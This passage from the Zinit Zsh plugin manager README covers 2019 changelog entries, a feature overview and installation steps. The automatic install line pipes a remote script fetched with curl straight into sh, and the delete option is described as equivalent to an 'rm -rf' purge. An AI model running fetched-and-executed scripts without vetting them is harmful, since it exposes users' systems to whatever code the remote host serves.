with an option (to use it, precede the ice content with &lt;code&gt;!&lt;/code&gt;) to automatically
forward the call afterwards. Example use:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Invoking the command `crasis' will load the plugin that&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; provides the function `crasis', and it will be then&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; immediately invoked with the same arguments&lt;/span&gt;
zinit ice trigger-load&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;!crasis&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
zinit load zdharma/zinit-crasis&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;22-10-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A new ice &lt;code&gt;countdown&lt;/code&gt; – causes an interruptable (by Ctrl-C) countdown 5…4…3…2…1…0
to be displayed before running the &lt;code&gt;atclone''&lt;/code&gt;, &lt;code&gt;atpull''&lt;/code&gt; and &lt;code&gt;make&lt;/code&gt; ices.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;21-10-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;times&lt;/code&gt; command has a new option &lt;code&gt;-m&lt;/code&gt; – it shows the &lt;strong&gt;moments&lt;/strong&gt; of the plugin
load times – i.e.: how late after loading Zinit a plugin has been loaded.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;20-10-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;zinit&lt;/code&gt; completion now completes also snippets! The command &lt;code&gt;snippet&lt;/code&gt;, but
also &lt;code&gt;delete&lt;/code&gt;, &lt;code&gt;recall&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;, &lt;code&gt;cd&lt;/code&gt;, etc. all receive such completing.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;ice&lt;/code&gt; subcommand can now be skipped – just pass in the ices, e.g.:
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit atload&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;zicompinit; zicdreplay&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; blockf
zinit light zsh-users/zsh-completions&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;compile&lt;/code&gt; command is able to compile snippets.&lt;/li&gt;
&lt;li&gt;The plugins that add their subdirectories into &lt;code&gt;$fpath&lt;/code&gt; can be now &lt;code&gt;blockf&lt;/code&gt;-ed –
the functions located in the dirs will be correctly auto-loaded.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;12-10-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Special value for the &lt;code&gt;id-as''&lt;/code&gt; ice – &lt;code&gt;auto&lt;/code&gt;. It sets the plugin/snippet ID
automatically to the last component of its spec, e.g.:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit ice id-as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;auto&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit load robobenklein/zinc&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;will load the plugin as &lt;code&gt;id-as'zinc'&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;14-09-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There's a Vim plugin which extends syntax highlighting of zsh scripts with coloring
of the Zinit commands. &lt;a href="https://github.com/zinit/zinit-vim-syntax"&gt;Project
homepage&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;13-09-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;New ice &lt;code&gt;aliases&lt;/code&gt; which loads plugin with the aliases mechanism enabled. Use for
plugins that define &lt;strong&gt;and use&lt;/strong&gt; aliases in their scripts.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;11-09-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;New ice-mods &lt;code&gt;sh&lt;/code&gt;,&lt;code&gt;bash&lt;/code&gt;,&lt;code&gt;ksh&lt;/code&gt;,&lt;code&gt;csh&lt;/code&gt; that load plugins (and snippets) with the
&lt;strong&gt;sticky emulation&lt;/strong&gt; feature of Zsh – all functions defined within the plugin will
automatically switch to the desired emulation mode before executing and switch back
thereafter. In other words it is now possible to load e.g. bash plugins with
Zinit, provided that the emulation level done by Zsh is sufficient, e.g.:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit ice bash pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;bash_it.sh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
        atinit&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;BASH_IT=&lt;span class="pl-smi"&gt;${ZINIT[PLUGINS_DIR]}&lt;/span&gt;/Bash-it---bash-it&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
        atclone&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;yes n | ./install.sh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit load Bash-it/bash-it&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This script loads correctly thanks to the emulation, however it isn't functional
because it uses &lt;code&gt;type -t …&lt;/code&gt; to check if a function exists.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;10-09-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A new ice-mod &lt;code&gt;reset''&lt;/code&gt; that ivokes &lt;code&gt;git reset --hard&lt;/code&gt; (or the provided command)
before &lt;code&gt;git pull&lt;/code&gt; and &lt;code&gt;atpull''&lt;/code&gt; ice. It can be used it to implement altering (i.e.
patching) of the plugin's files inside the &lt;code&gt;atpull''&lt;/code&gt; ice – &lt;code&gt;git&lt;/code&gt; will report no
conflicts when doing &lt;code&gt;pull&lt;/code&gt;, and the changes can be then again introduced by the
&lt;code&gt;atpull''&lt;/code&gt; ice.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Three new Zinit annexes (i.e.
&lt;a href="http://zdharma.org/zinit/wiki/Annexes/" rel="nofollow"&gt;extensions&lt;/a&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/zinit/z-a-man"&gt;z-a-man&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Generates man pages and code-documentation man pages from plugin's README.md
and source files (the code documentation is obtained from
&lt;a href="https://github.com/zdharma/zshelldoc"&gt;Zshelldoc&lt;/a&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/zinit/z-a-test"&gt;z-a-test&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Runs tests (if detected &lt;code&gt;test&lt;/code&gt; target in a &lt;code&gt;Makefile&lt;/code&gt; or any &lt;code&gt;*.zunit&lt;/code&gt; files)
on plugin installation and non-empty update.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/zinit/z-a-patch-dl"&gt;z-a-patch-dl&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Allows easy download and applying of patches, to e.g. aid building a binary
program equipped in the plugin.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A new variable is being recognized by the installation script:
&lt;code&gt;$ZPLG_BIN_DIR_NAME&lt;/code&gt;. It configures the directory within &lt;code&gt;$ZPLG_HOME&lt;/code&gt; to which
Zinit should be cloned.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;09-08-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A new ice-mod &lt;code&gt;wrap-track''&lt;/code&gt; which gets &lt;code&gt;;&lt;/code&gt;-separated list of functions that are to
be tracked &lt;strong&gt;once&lt;/strong&gt; when executing. In other words you can extend the tracking
beyond the moment of loading of a plugin.&lt;/li&gt;
&lt;li&gt;The unloading of Zle widgets is now more smart – it takes into account the chains
of plugins that can overload the Zle widgets, and solves the interactions that
result out of it.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;29-07-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;delete&lt;/code&gt; now supports following options:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--all&lt;/code&gt; – deletes all plugins and snippets (a purge, similar to &lt;code&gt;rm -rf ${ZINIT[PLUGINS_DIR]} ${ZINIT[SNIPPETS_DIR]}&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--clean&lt;/code&gt; – deletes only plugins and snippets that are &lt;strong&gt;currently not loaded&lt;/strong&gt;
in the current session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;09-07-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Zinit can now have &lt;strong&gt;its own plugins&lt;/strong&gt;, called &lt;strong&gt;z-plugins&lt;/strong&gt;! Check out an
example but fully functional z-plugin
&lt;a href="https://github.com/zdharma/z-p-submods"&gt;zdharma/z-p-submods&lt;/a&gt; and a document that
explains on how to implement your own z-plugin
(&lt;a href="../../wiki/Z-PLUGINS"&gt;here&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;08-07-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You can now do &lt;code&gt;zinit ice wait ...&lt;/code&gt; and it will work as &lt;code&gt;zinit ice wait'0' ...&lt;/code&gt;
:) I.e. when there's no value to the &lt;code&gt;wait''&lt;/code&gt; ice then a value of &lt;code&gt;0&lt;/code&gt; is being
substituted.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;02-07-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://asciinema.org/a/254630" rel="nofollow"&gt;Cooperation of Fast-Syntax-Highlighting and
Zinit&lt;/a&gt; – a new precise highlighting for
Zinit in F-Sy-H.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;01-07-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;atclone''&lt;/code&gt;, &lt;code&gt;atpull''&lt;/code&gt; &amp;amp; &lt;code&gt;make''&lt;/code&gt; get run in the same subshell, thus an e.g.
export done in &lt;code&gt;atclone''&lt;/code&gt; will be visible during the &lt;code&gt;make&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;26-06-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;notify''&lt;/code&gt; contents gets evaluated, i.e. can contain active code like &lt;code&gt;$(tail -1 /var/log/messages)&lt;/code&gt;, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;23-06-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;New ice mod &lt;code&gt;subscribe''&lt;/code&gt;/&lt;code&gt;on-update-of''&lt;/code&gt; which works like the
&lt;code&gt;wait''&lt;/code&gt; ice-mod, i.e. defers loading of a plugin, but it &lt;strong&gt;looks at
modification time of the given file(s)&lt;/strong&gt;, and when it changes, it then
triggers loading of the plugin/snippet:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;% zinit ice on-update-of&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;{~/files-*,/tmp/files-*}&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; lucid \
    atload&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;echo I have been loaded&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
    notify&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Yes that's true :)&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
% zinit load zdharma/null
% touch &lt;span class="pl-k"&gt;~&lt;/span&gt;/files-1
The plugin has been loaded
%
Yes that&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;s true :)&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The plugin/snippet will be sourced as many times as the file gets updated.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;22-06-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;New ice mod &lt;code&gt;reset-prompt&lt;/code&gt; that will issue &lt;code&gt;zle .reset-prompt&lt;/code&gt; after loading the
plugin or snippet, causing the prompt to be recomputed. Useful with themes &amp;amp;
Turbo mode.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New ice-mod &lt;code&gt;notify''&lt;/code&gt; which will cause to display an under-prompt notification
when the plugin or snippet gets loaded. E.g.:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;% zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;0&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid notify&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;zdharma/null has been loaded&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
% zinit light zdharma/null
%
zdharma/null has been loaded&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In case of problems with the loading a warning message will be output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;% zinit ice notify atload'return 7'
% zinit light zdharma/null
%
notify: Plugin not loaded / loaded with problem, the return code: 7
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Refer to &lt;a href="#ice-modifiers"&gt;Ice Modifiers&lt;/a&gt; section for a complete description.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;29-05-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Turbo mode, i.e. the &lt;code&gt;wait''&lt;/code&gt; ice-mode now supports a suffix – the letter &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt;
or &lt;code&gt;c&lt;/code&gt;. The meaning is illustrated by the following example:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;0b&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;command&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;wd.sh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atinit&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;echo Firing 1&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid
zinit light mfaerevaag/wd
zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;0a&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;command&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;wd.sh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atinit&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;echo Firing 2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid
zinit light mfaerevaag/wd

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; The output&lt;/span&gt;
Firing 2
Firing 1&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As it can be seen, the second plugin has been loaded first. That's because there
are now three sub-slots (the &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; and &lt;code&gt;c&lt;/code&gt;) in which the plugin/snippet loadings
can be put into. Plugins from the same time-slot with suffix &lt;code&gt;a&lt;/code&gt; will be loaded
before plugins with suffix &lt;code&gt;b&lt;/code&gt;, etc.&lt;/p&gt;
&lt;p&gt;In other words, instead of &lt;code&gt;wait'1'&lt;/code&gt; you can enter &lt;code&gt;wait'1a'&lt;/code&gt;,
&lt;code&gt;wait'1b'&lt;/code&gt; and &lt;code&gt;wait'1c'&lt;/code&gt; – to this way &lt;strong&gt;impose order&lt;/strong&gt; on the loadings
&lt;strong&gt;regardless of the order of &lt;code&gt;zinit&lt;/code&gt; commands&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;p&gt;To see the full history check &lt;a href="CHANGELOG.md"&gt;the changelog&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-zinit" class="anchor" aria-hidden="true" href="#zinit"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Zinit&lt;/h1&gt;
&lt;p align="center"&gt;
&lt;a href="https://github.com/zdharma/pm-perf-test"&gt;
&lt;img width="550px" src="https://raw.githubusercontent.com/zdharma/zinit/images/startup-times.png" style="max-width:100%;"&gt;
&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Zinit is an elastic and fast Zshell plugin manager that will allow you to
install everything from GitHub and other sites.&lt;/p&gt;
&lt;p&gt;Zinit is currently the only plugin manager out there that has Turbo mode which yields
&lt;strong&gt;50-80% faster Zsh startup!&lt;/strong&gt; (i.e.: the shell will start up to &lt;strong&gt;5&lt;/strong&gt; times faster!). Check
out a speed comparison with other popular plugin managers
&lt;a href="https://github.com/zdharma/pm-perf-test"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Zinit gives &lt;strong&gt;reports&lt;/strong&gt; from plugin load describing what aliases, functions,
bindkeys, Zle widgets, zstyles, completions, variables, &lt;code&gt;PATH&lt;/code&gt; and &lt;code&gt;FPATH&lt;/code&gt;
elements a plugin has set up.&lt;/p&gt;
&lt;p&gt;Supported is &lt;strong&gt;unloading&lt;/strong&gt; of plugin and ability to list, (un)install and
selectively disable, enable plugin's completions.&lt;/p&gt;
&lt;p&gt;The system does not use &lt;code&gt;$FPATH&lt;/code&gt;, loading multiple plugins doesn't clutter
&lt;code&gt;$FPATH&lt;/code&gt; with the same number of entries (e.g. &lt;code&gt;10&lt;/code&gt;). Code is immune to
&lt;code&gt;KSH_ARRAYS&lt;/code&gt;. Completion management functionality is provided to allow user
to call &lt;code&gt;compinit&lt;/code&gt; only once in &lt;code&gt;.zshrc&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-zinit-wiki" class="anchor" aria-hidden="true" href="#zinit-wiki"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Zinit Wiki&lt;/h1&gt;
&lt;p&gt;The information in this README is complemented by the &lt;a href="http://zdharma.org/zinit/wiki/" rel="nofollow"&gt;Zinit wiki&lt;/a&gt;. The README is an introductory overview of Zinit while the wiki gives a complete and in-depth information with examples. Make sure to read it to get the most out of Zinit.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-option-1---automatic-installation-recommended" class="anchor" aria-hidden="true" href="#option-1---automatic-installation-recommended"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Option 1 - Automatic Installation (Recommended)&lt;/h2&gt;
&lt;p&gt;The easiest way to install Zinit is to execute:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;sh -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/zdharma/zinit/master/doc/install.sh&lt;span class="pl-pds"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will install Zinit in &lt;code&gt;~/.zinit/bin&lt;/code&gt;. &lt;code&gt;.zshrc&lt;/code&gt; will be updated with three
lines of code that will be added to the bottom. The lines will be sourcing
&lt;code&gt;zinit.zsh&lt;/code&gt; and setting up completion for command &lt;code&gt;zinit&lt;/code&gt;. After installing and
reloading the shell compile Zinit with &lt;code&gt;zinit self-update&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-option-2---manual-installation" class="anchor" aria-hidden="true" href="#option-2---manual-installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Option 2 - Manual Installation&lt;/h2&gt;
&lt;p&gt;To manually install Zinit clone the repo to e.g. &lt;code&gt;~/.zinit/bin&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;mkdir &lt;span class="pl-k"&gt;~&lt;/span&gt;/.zinit
git clone https://github.com/zdharma/zinit.git &lt;span class="pl-k"&gt;~&lt;/span&gt;/.zinit/bin&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and source it from &lt;code&gt;.zshrc&lt;/code&gt; (above compinit):&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;source&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/.zinit/bin/zinit.zsh&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you place the &lt;code&gt;source&lt;/code&gt; below &lt;code&gt;compinit&lt;/code&gt;, then add those two lines after the &lt;code&gt;source&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;autoload -Uz _zinit
&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;((&lt;/span&gt; &lt;span class="pl-smi"&gt;${+_comps}&lt;/span&gt; &lt;span class="pl-pds"&gt;))&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; _comps[zinit]=_zinit&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Various paths can be customized, see section &lt;a href="#customizing-paths"&gt;Customizing Paths&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After installing and reloading the shell compile Zinit with &lt;code&gt;zinit self-update&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-usage" class="anchor" aria-hidden="true" href="#usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Usage&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-introduction" class="anchor" aria-hidden="true" href="#introduction"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
